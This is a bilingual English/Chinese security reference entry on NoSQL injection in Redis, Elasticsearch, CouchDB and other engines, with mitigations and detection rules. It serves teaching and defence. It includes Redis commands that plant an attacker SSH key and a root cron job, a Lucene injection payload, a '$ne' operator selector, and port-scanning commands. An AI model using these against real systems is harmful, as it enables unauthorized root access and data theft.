---
id: nosqli-other-databases-and-defense
title_en: "NoSQL Injection, Part 2 — Other Databases, and the Defence"
title_zh: "NoSQL 注入（二）：其他数据库与防御"
summary_en: Every NoSQL engine has its own query interface and each one fails differently, but they sort into three shapes — a query language that gets concatenated, an object query that accepts operators, or a script engine that runs what you send. This entry covers Redis, Elasticsearch, CouchDB and the rest, separates injection from exposed admin ports, and lays out the defence.
summary_zh: 每一种 NoSQL 引擎都有自己的查询接口，失败的方式也各不相同，但它们能归成三种形状 —— 被拼接的查询语言、接受运算符的对象查询、以及会执行你发过去的脚本引擎。这一篇讲 Redis、Elasticsearch、CouchDB 和其余的，把"注入"与"管理端口暴露"分开，并给出防御。
tags: [web, nosql-injection, redis, elasticsearch, couchdb, cypher]
tools: [redis-cli, curl, mongosh, nmap, NoSQLMap]
attck: [T1190, T1133]
platform: [web]
difficulty: intermediate
updated: 2026-10-08
---

<!-- lang:en -->
### Three shapes, not a hundred

MongoDB was part 1 because it is the common case, not because it is special. Every other engine looks different on the surface and sorts into the same three shapes:

| Shape | How it fails | Engines that fit |
|---|---|---|
| **Object query with operators** | A value becomes an operator, because user input was parsed into the query structure | MongoDB, CouchDB's Mango `_find` |
| **Query language, concatenated** | A string is built by concatenation, so a quote ends the developer's part | Cassandra (CQL), Neo4j (Cypher), and anything SQL-like |
| **Script engine** | The engine executes what you send, in a language it sandboxes imperfectly | MongoDB `$where`, Elasticsearch Painless, CouchDB views |

Two consequences follow. First, **the mechanism tells you the fix**: type checking for the first shape, channel separation for the second, and not running untrusted code for the third. Second, **a report that says "NoSQL injection" without naming the shape does not tell the developer anything actionable** — and in practice a large share of what gets labelled NoSQL injection is neither of the three.

### Before anything else: exposed admin ports are not injection

This distinction saves time and keeps assessments honest. A large fraction of real-world "NoSQL attacks" are **not injection at all** — they are databases reachable from the internet with no authentication. The exploitation is trivial and the impact is severe, but nothing about it involves crafting a query.

| Engine | Default port | Common exposure |
|---|---|---|
| MongoDB | 27017 | Historically bound to `0.0.0.0` with no auth by default |
| Redis | 6379 | No password by default, historically |
| Elasticsearch | 9200 | Open by default before X-Pack security |
| CouchDB | 5984 | The "admin party" default: no admin account at all |
| Memcached | 11211 | No auth at all, by design |

```bash
# what finding one looks like, and why it is worth checking first
nmap -Pn -p 27017,6379,9200,5984,11211 target
curl -s http://target:9200/ | head -20            # an open Elasticsearch answers
redis-cli -h target ping                          # PONG with no password
```

If any of those respond without credentials, the finding is **"the database is exposed"** — a configuration and network problem, with a fix in the network layer rather than in the application's query building. It is worth checking before spending an hour on injection payloads, and it is worth writing up as what it is.

### Redis

**The interface.** Redis speaks a simple protocol (RESP): an array of bulk strings, sent as

```
*3\r\n$3\r\nSET\r\n$3\r\nkey\r\n$5\r\nvalue\r\n
```

Commands are **structurally separated** — the client sends an array of argument strings, and the server reads a defined number of them. That is why classic command injection into Redis is *rarer* than people assume: there is no single string for a newline or a quote to escape into. It becomes possible only when an application builds that array from user input in a way that lets the user **add arguments**, or when it uses the scripting interfaces.

**Where injection actually appears:**

- **`EVAL` / `EVALSHA` with concatenated Lua.** The script body is a string; if it is built by concatenation, it is code injection with the same fix as SQLi.
- **Keys and patterns as user input.** `KEYS <user input>`, `SCAN`, or a `GET` whose key is user-controlled: not injection, but **enumeration and unauthorised access** when combined with a weak permission model.
- **Command concatenation in application code** that builds a protocol string manually rather than using a client library. This is where a crafted value can smuggle an extra command.

**What exposed Redis gives an attacker** — again, not injection, but the reason exposure matters:

```
# classic: write an SSH key through the persistence mechanism
CONFIG SET dir /root/.ssh/
CONFIG SET dbfilename authorized_keys
SET x "\n\nssh-rsa AAAA... attacker@host\n\n"
SAVE

# variants: write a crontab file, write into a web root if the process user can
CONFIG SET dir /var/spool/cron/
CONFIG SET dbfilename root
SET x "\n* * * * * /bin/bash -c '...'\n"
SAVE
```

And on Redis 4.x and 5.x, the **replication** feature was abused to load a malicious module from an attacker-controlled host, achieving code execution — a reminder that "the database is exposed" is not a lesser finding than "the query is injectable". Both end in full control; they are just different bugs.

**Mitigation, in order:** bind to a private interface and never expose the port; set `requirepass`; keep `protected-mode` on; **rename or disable dangerous commands** for the application's connection (`CONFIG`, `EVAL`, `SLAVEOF`, `MODULE`, `FLUSHALL`); and run the process as an unprivileged user, because the file-writing tricks depend on where that user can write.

```conf
# redis.conf, the short version
bind 127.0.0.1
requirepass <strong-secret>
rename-command CONFIG ""
rename-command EVAL ""
rename-command SLAVEOF ""
rename-command MODULE ""
```

### Elasticsearch

**Two query interfaces, both injectable.**

**1. Lucene query strings.** The `q=` parameter takes a *query string* with its own syntax: `field:value`, `AND`/`OR`/`NOT`, wildcards, ranges, grouping.

```
q=title:(security OR hacking)
q=title:sec*           
q=*:*                  
```

If an application builds that string by concatenation, the same failure as SQL appears — and the interesting part is what it enables: `*:*` enumerates everything, field syntax exposes fields the application never intended to search, and grouped operators can turn a filtered query into an unfiltered one.

```python
# the vulnerable pattern, and the payload's effect
user_input = "sec* OR *:*"                      # what an attacker sends
query = "title:(" + user_input + ")"            # built by concatenation
print("query sent:", query)                     # title:(sec* OR *:*)

# the structural fix: never build a query string; use the JSON query DSL with
# each user value in its own field, which is Elasticsearch's version of a parameter
safe = {"query": {"match": {"title": user_input}}}
print("safe form :", safe)
```

**2. Scripts.** Elasticsearch's scripting (`script_fields`, `_update` with a script) runs Painless in a sandbox. Sending a script through user input is code injection on the same pattern as `$where`, and it has a history: **CVE-2014-3120** allowed Groovy scripts through the search API and led to remote code execution, and **CVE-2015-1427** bypassed the sandbox that was added in response. Both are patched, and both are object lessons in what "the engine executes what you send" means.

**The mitigating controls are unusually clear-cut:**

- **Do not expose 9200.** It is an administrative interface. Put it behind the application, on a private network.
- **Enable authentication** (X-Pack security, or an equivalent) and TLS. Older Elasticsearch shipped with none.
- **Restrict scripting**: `script.allowed_types: inline` is a deliberate decision, and `none` is the right one for most deployments.
- **Use the structured DSL, never a concatenated query string.** A `match` query puts the value in a value position; a Lucene string puts it in a syntax position.

### CouchDB

**Three interfaces**, and one of them was a vulnerability by design.

**1. `_find` (Mango).** A JSON selector, structurally identical to a MongoDB query:

```json
{"selector": {"username": {"$ne": null}}}
```

Same operator injection, same fix: reject non-string input for string fields.

**2. MapReduce views.** Views are written by the developer and stored on the server, so user input does not normally reach them — except through the **`_temp_view`** endpoint, which accepted a JavaScript view **in the request body**.

**3. The "admin party".** CouchDB 1.x shipped with **no administrator account**. In that state, anyone who could reach the port was an administrator: they could create databases, read every document, and — with `_temp_view` — submit arbitrary JavaScript. That combination was a remote code execution by default configuration, and it is the clearest case in this entry of an exposed administration interface being the whole vulnerability.

CouchDB 2.x introduced a setup step and 3.x **requires** an administrator, which removed the admin party. `_temp_view` was also removed. Both are examples of a project closing the gap at the configuration layer rather than patching an input handler.

**Mitigation:** set an administrator (mandatory in 3.x), never expose 5984 to an untrusted network, and validate selector types the same way you would for MongoDB.

### The rest, briefly

| Engine | Query interface | Injection shape |
|---|---|---|
| **Cassandra** | CQL — SQL-like, prepared statements exist | String concatenation, like SQL; use prepared statements |
| **Neo4j** | Cypher — pattern-matching language | String concatenation; a quote ends the literal, exactly as in SQL |
| **HBase** | API and filters | Little query-language surface; exposure and authorisation are the issues |
| **DynamoDB** | API with structured conditions | Very little injection surface; the equivalent risk is over-permissive IAM |
| **Memcached** | Simple text protocol | No auth at all by design; exposure and cache poisoning |

The pattern to notice: **the closer an engine is to a text query language, the more its injection looks like SQL injection** — and the fix is the same one, prepared statements or structured binding where the engine supports it. **The closer it is to a structured API, the more the risk is authorisation and configuration** rather than injection.

### Tools, and why this stays manual

`NoSQLMap` and `nosqli` exist, and they are useful for the common case — MongoDB, authentication bypass, `$regex` extraction. Beyond that, tooling thins out fast, and the reason is structural rather than a gap in effort:

- Every engine has a **different query language**, so a generic payload set does not exist.
- The interesting bugs are **application-shaped** — which field is parsed into the query, and how — and that is not something a scanner can infer from outside.
- Several of the highest-impact findings here are **not injection at all** but exposure, which a port scan finds in a second.

So the practical division: **let a scanner find exposed ports, and understand the mechanism yourself for the injected ones.** The first saves you time; the second is the only way to know whether a finding is real.

### Detection and mitigation

- **Scan your own estate for exposed NoSQL ports, on a schedule.** 27017, 6379, 9200, 5984 and 11211 reachable from an untrusted network is a finding regardless of anything else. This is the highest-value control in this entry, and unlike injection detection it requires no understanding of the application.
- **Turn on authentication everywhere, and verify it by trying to connect without credentials.** MongoDB's `auth`, Redis's `requirepass`, Elasticsearch's security module, CouchDB's administrator. Every one of these has a default of "no auth" in some version, and the version you are running decides.
- **Alert on the script and operator surfaces in request logs.** `$where`, `$ne`, `$regex`, `"script"`, `_temp_view`, and Lucene syntax characters (`*:*`, grouped `OR`) in user input are all structural anomalies: they are the database's vocabulary appearing in a client's request. A cheap string rule catches the common cases.
- **Watch for the query-shape anomalies on the database side.** A full collection or index scan triggered by a query that normally uses an index (which is what `$where` and unrestricted scripts cause), a sudden rise in slow queries, and replicated-command or module-load operations on Redis are all visible in the engine's own logs and profiler.
- **Fix the shape, not the payload.** Type-check string fields so an operator cannot be represented; bind or prepare where the engine has a text query language; disable scripting where it is not needed; use the structured DSL instead of building query strings. Each of these removes a mechanism rather than a spelling, which is the same argument as everywhere else in this series.
- **Keep the two findings separate in reports.** "The database is internet-facing with no authentication" and "the application concatenates user input into a query" are different bugs with different owners and different fixes. Merging them into one "NoSQL issue" line makes both harder to action — and the first one is often the more serious of the two.

<!-- lang:zh -->
### 三种形状，而不是一百种

MongoDB 排在第一篇是因为它是最常见的情况，不是因为它特殊。其他每一种引擎在表面上看起来都不同，但都能归到同样的三种形状里：

| 形状 | 它怎么出问题 | 符合的引擎 |
|---|---|---|
| **带运算符的对象查询** | 一个值变成了运算符，因为用户输入被解析进了查询结构 | MongoDB、CouchDB 的 Mango `_find` |
| **被拼接的查询语言** | 字符串由拼接构建，于是一个引号结束了开发者那部分 | Cassandra（CQL）、Neo4j（Cypher），以及任何像 SQL 的东西 |
| **脚本引擎** | 引擎执行你发过去的东西，而它的沙箱并不完美 | MongoDB 的 `$where`、Elasticsearch 的 Painless、CouchDB 的视图 |

由此有两个后果。第一，**机制告诉你修法**：第一种形状靠类型校验，第二种靠通道分离，第三种靠不执行不可信代码。第二，**一份只说"NoSQL 注入"、不说是哪种形状的报告，没有给开发者任何可执行的信息** —— 而且实践中，被贴上 NoSQL 注入标签的东西里有相当一部分三种都不是。

### 先说一件要紧事：暴露的管理端口不是注入

这个区分省时间，也让评估诚实。现实世界里很大一部分"NoSQL 攻击"**根本不是注入** —— 而是能从互联网上直接够到、并且没有认证的数据库。利用过程很简单、影响很严重，但它跟构造查询毫无关系。

| 引擎 | 默认端口 | 常见暴露情况 |
|---|---|---|
| MongoDB | 27017 | 历史上默认绑定 `0.0.0.0` 且没有认证 |
| Redis | 6379 | 历史上默认没有口令 |
| Elasticsearch | 9200 | X-Pack 安全模块出现之前默认敞开 |
| CouchDB | 5984 | 著名的 "admin party" 默认：完全没有管理员账号 |
| Memcached | 11211 | 按设计就没有任何认证 |

```bash
# 发现一个长什么样，以及为什么值得先查这个
nmap -Pn -p 27017,6379,9200,5984,11211 target
curl -s http://target:9200/ | head -20            # 敞开的 Elasticsearch 会应答
redis-cli -h target ping                          # 没有口令也回 PONG
```

如果上面任何一个不需要凭据就应答，那么发现就是"**这个数据库暴露了**" —— 一个配置与网络问题，修法在网络层，而不是在应用的查询构造里。值得在花一小时研究注入载荷之前先查一遍，也值得**按它本来的样子**写进报告。

### Redis

**接口。** Redis 说的是一种简单协议（RESP）：一组批量字符串，形式是

```
*3\r\n$3\r\nSET\r\n$3\r\nkey\r\n$5\r\nvalue\r\n
```

命令是**结构上分隔**的 —— 客户端发一个参数数组，服务器读固定个数 —— 这就是为什么经典的"命令注入 Redis"比人们以为的**更少见**：没有一整个字符串让换行或引号逃逸进去。只有当应用用某种方式从用户输入构造那个数组、让用户能**增加参数**时，或者用了脚本接口时，它才成为可能。

**注入实际出现在哪儿：**

- **`EVAL` / `EVALSHA` 配拼接的 Lua。** 脚本体是一个字符串；如果它是拼接出来的，那就是代码注入，修法和 SQLi 一样。
- **把键名和模式当用户输入。** `KEYS <用户输入>`、`SCAN`，或者键名由用户控制的 `GET`：这不是注入，但和薄弱的权限模型一结合，就是**枚举与越权访问**。
- **应用代码里手工拼协议字符串**，而不是用客户端库。那里一个精心构造的值可以夹带一条多余的命令。

**敞开的 Redis 能给攻击者什么** —— 再说一次，不是注入，但这是"暴露"要紧的原因：

```
# 经典：通过持久化机制写一个 SSH 公钥
CONFIG SET dir /root/.ssh/
CONFIG SET dbfilename authorized_keys
SET x "\n\nssh-rsa AAAA... attacker@host\n\n"
SAVE

# 变体：写 crontab，或者在进程用户能写的地方写进 web 根目录
CONFIG SET dir /var/spool/cron/
CONFIG SET dbfilename root
SET x "\n* * * * * /bin/bash -c '...'\n"
SAVE
```

而在 Redis 4.x 和 5.x 上，**主从复制**功能被滥用，从攻击者控制的主机加载恶意模块，从而实现代码执行 —— 这提醒我们："数据库暴露了"并不比"查询可注入"轻。两者最终都通向完全控制，只是不同的 bug。

**缓解，按顺序：** 绑定到内网接口、绝不暴露端口；设置 `requirepass`；保持 `protected-mode` 开启；对应用的连接**改名或禁用危险命令**（`CONFIG`、`EVAL`、`SLAVEOF`、`MODULE`、`FLUSHALL`）；并以非特权用户运行该进程，因为那些写文件的把戏取决于那个用户能写到哪。

```conf
# redis.conf，简版
bind 127.0.0.1
requirepass <强口令>
rename-command CONFIG ""
rename-command EVAL ""
rename-command SLAVEOF ""
rename-command MODULE ""
```

### Elasticsearch

**两个查询接口，两个都可注入。**

**一、Lucene 查询字符串。** `q=` 参数接受的是一个**查询字符串**，有自己的语法：`field:value`、`AND`/`OR`/`NOT`、通配符、范围、分组。

```
q=title:(security OR hacking)
q=title:sec*
q=*:*
```

如果应用用拼接构造那个字符串，跟 SQL 一样的失败就出现了 —— 而有意思的是它能做什么：`*:*` 枚举一切、字段语法暴露出应用从没打算让人搜的字段、分组运算符能把一条被过滤的查询变成不过滤的。

```python
# 有漏洞的写法，以及那个 payload 的效果
user_input = "sec* OR *:*"                      # 攻击者发来的东西
query = "title:(" + user_input + ")"            # 拼接构建
print("发出的查询:", query)                      # title:(sec* OR *:*)

# 结构性的修法：绝不拼接查询字符串，改用 JSON 查询 DSL，
# 把每个用户值放进它自己的字段里 —— 这就是 Elasticsearch 版的"参数"
safe = {"query": {"match": {"title": user_input}}}
print("安全形式  :", safe)
```

**二、脚本。** Elasticsearch 的脚本能力（`script_fields`、带脚本的 `_update`）在沙箱里跑 Painless。把脚本经由用户输入送进去，就是和 `$where` 同一个模式的代码注入，而且它有历史：**CVE-2014-3120** 允许通过搜索 API 执行 Groovy 脚本并导致远程代码执行，而 **CVE-2015-1427** 绕过了为应对它而加入的沙箱。两者都已修补，而两者都是关于"引擎会执行你发过去的东西"这一点的教材。

**它的缓解控制异常清晰：**

- **不要暴露 9200。** 那是一个管理接口。把它放在应用后面、内网里面。
- **启用认证**（X-Pack 安全模块或等价物）和 TLS。老版本 Elasticsearch 两者都没有。
- **限制脚本**：`script.allowed_types: inline` 是一个需要刻意做出的决定，而对多数部署来说 `none` 才是对的那个。
- **用结构化 DSL，绝不用拼接的查询字符串。** `match` 查询把值放在值的位置；Lucene 字符串把它放在**语法**的位置。

### CouchDB

**三个接口**，其中一个在设计上就是漏洞。

**一、`_find`（Mango）。** 一个 JSON 选择器，结构和 MongoDB 查询完全一样：

```json
{"selector": {"username": {"$ne": null}}}
```

同样的运算符注入、同样的修法：字符串字段拒收非字符串输入。

**二、MapReduce 视图。** 视图由开发者编写、存在服务器上，所以用户输入通常到不了那里 —— 除了 **`_temp_view`** 这个端点，它在**请求体里**接受一个 JavaScript 视图。

**三、"admin party"。** CouchDB 1.x 出厂时**没有管理员账号**。在那个状态下，任何能连上端口的人都是管理员：可以建库、读每一个文档，而且配合 `_temp_view` 可以提交任意 JavaScript。这个组合就是**默认配置下的远程代码执行**，也是这一篇里"暴露的管理接口本身就是全部漏洞"最清楚的例子。

CouchDB 2.x 引入了初始化步骤，3.x **强制要求**管理员，这就去掉了 admin party；`_temp_view` 也被移除了。两者都是项目**在配置层**补上缺口，而不是去修补一个输入处理函数。

**缓解：** 设置管理员（3.x 里是强制的）、绝不把 5984 暴露给不可信网络、并像对 MongoDB 那样校验选择器的类型。

### 其余的，简单说

| 引擎 | 查询接口 | 注入形状 |
|---|---|---|
| **Cassandra** | CQL —— 类 SQL，且有预编译语句 | 字符串拼接，和 SQL 一样；用预编译语句 |
| **Neo4j** | Cypher —— 模式匹配语言 | 字符串拼接；一个引号结束字面量，和 SQL 里一模一样 |
| **HBase** | API 与过滤器 | 查询语言面很小；问题在暴露与授权 |
| **DynamoDB** | 带结构化条件的 API | 注入面极小；对应的风险是 IAM 权限过宽 |
| **Memcached** | 简单的文本协议 | 按设计没有认证；暴露与缓存投毒 |

要找的规律是：**一个引擎越接近文本查询语言，它的注入就越像 SQL 注入** —— 而修法也是同一个：在引擎支持的地方用预编译语句或结构化绑定。**一个引擎越接近结构化 API，风险就越在授权与配置上**，而不在注入上。

### 工具，以及为什么这里主要还是手工

`NoSQLMap` 和 `nosqli` 是存在的，对常见情况（MongoDB、认证绕过、`$regex` 提取）挺有用。再往外，工具很快就稀薄了，而这个原因是结构性的，不是投入不够：

- 每种引擎的**查询语言都不同**，所以不存在一套通用的载荷。
- 有意思的 bug 是**应用形状的** —— 哪个字段被解析进了查询、怎么进的 —— 而这不是扫描器从外面能推断出来的。
- 这里好几个最高影响的发现**根本不是注入**，而是暴露 —— 一次端口扫描一秒钟就能找到。

所以实用的分工是：**让扫描器去找暴露的端口，而注入的那些自己把机制搞懂。** 前者省时间；后者是唯一能让你判断"这条发现是不是真的"的方式。

### 检测与缓解

- **定期扫描自己资产里暴露的 NoSQL 端口。** 27017、6379、9200、5984、11211 从不可信网络可达，这本身就是发现，与别的都无关。这是这一篇里价值最高的控制，而且和注入检测不同，它不需要理解应用。
- **处处开启认证，并且用"不带凭据去连"来验证它真的开了。** MongoDB 的 `auth`、Redis 的 `requirepass`、Elasticsearch 的安全模块、CouchDB 的管理员。这些在某一些版本里默认都是"没有认证"，而你跑的版本决定是哪个。
- **对请求日志里的脚本与运算符面告警。** 用户输入里出现 `$where`、`$ne`、`$regex`、`"script"`、`_temp_view`，以及 Lucene 的语法字符（`*:*`、分组的 `OR`），全是结构性异常：它们是**数据库的词汇出现在了客户端的请求里**。一条便宜的字符串规则就能抓住常见情况。
- **在数据库侧盯查询形状的异常。** 一条平时走索引的查询引发了全集合或全索引扫描（这正是 `$where` 和无限制脚本造成的）、慢查询突然增多、以及 Redis 上的复制命令或模块加载 —— 这些在引擎自己的日志和 profiler 里都看得见。
- **修形状，不修载荷。** 对字符串字段做类型校验，让运算符**无法被表示**；在引擎有文本查询语言的地方用绑定或预编译；不需要脚本的地方禁用脚本；用结构化 DSL 而不是拼查询字符串。每一条移除的是一种**机制**而不是一种拼法 —— 和这个系列里其他地方是同一个论证。
- **报告里把两种发现分开。** "数据库裸露在互联网上且没有认证"和"应用把用户输入拼接进了查询"是不同的 bug，有不同的责任方、不同的修法。把它们合并成一条"NoSQL 问题"会让两者都更难处理 —— 而前者常常是更严重的那个。
